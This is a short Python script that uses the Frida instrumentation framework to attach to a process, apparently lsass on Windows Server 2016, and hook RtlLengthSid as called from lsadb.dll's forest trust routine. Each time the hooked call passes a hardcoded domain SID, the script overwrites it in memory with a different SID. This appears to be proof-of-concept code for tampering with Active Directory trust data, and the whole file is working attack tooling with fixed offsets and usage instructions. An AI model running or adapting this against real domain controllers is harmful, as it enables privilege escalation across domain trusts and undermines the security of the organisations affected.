# /// script
# requires-python = ">=3.14"
# dependencies = [
#     "frida>=17.17.0",
# ]
# ///
from __future__ import print_function
import frida
import sys

def on_message(message, data):
    print("[%s] => %s" % (message, data))

def main(target_process):
    session = frida.attach(target_process)

    script = session.create_script("""
// Find base address of current imported lsadb.dll by lsass
var baseAddr = Module.findBaseAddress('lsadb.dll');
console.log('lsadb.dll baseAddr: ' + baseAddr);
// Add call to RtlLengthSid from LsaDbpDsForestBuildTrustEntryForAttrBlock
// (address valid for Server 2016 v1607)
var returnaddr = ptr('0x151dc');
var resolvedreturnaddr = baseAddr.add(returnaddr)
// Sid as binary array to find/replace
var buf1 = [0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x10, 0x31, 0xE7, 0x3A, 0x49, 0xBA, 0x03, 0x75, 0x0B, 0xEC, 0x26];
var newsid = [0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x78, 0xB8, 0x8A, 0xC5, 0x88, 0x0E, 0x6F, 0xDB, 0xC7, 0xC5, 0xCC];
// Find module and attach
var f = Module.getExportByName('ntdll.dll', 'RtlLengthSid');
Interceptor.attach(f, {
  onEnter: function (args) {
    // Only do something calls that have the return address we want
    if(this.returnAddress.equals(resolvedreturnaddr)){
        console.log("entering intercepted function will return to r2 " + this.returnAddress);
        // Dump current SID
        console.log(hexdump(args[0], {
          offset: 0,
          length: 24,
          header: true,
          ansi: false
        }));
        // If this is the sid to replace, do so
        if(equal(buf1, args[0].readByteArray(24))){
            console.log("sid matches!");
            args[0].writeByteArray(newsid);
            console.log("modified SID in response");
        }
    }
  },
});
function equal (buf1, buf2)
{
    var dv1 = buf1;
    var dv2 = new Uint8Array(buf2);
    for (var i = 0 ; i != buf2.byteLength ; i++)
    {
        if (dv1[i] != dv2[i]){
            return false;
        }
    }
    return true;
}

""")
    script.on('message', on_message)
    script.load()
    print("[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.\n\n")
    sys.stdin.read()
    session.detach()

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: %s <process name or PID>" % __file__)
        sys.exit(1)

    try:
        target_process = int(sys.argv[1])
    except ValueError:
        target_process = sys.argv[1]
    main(target_process)
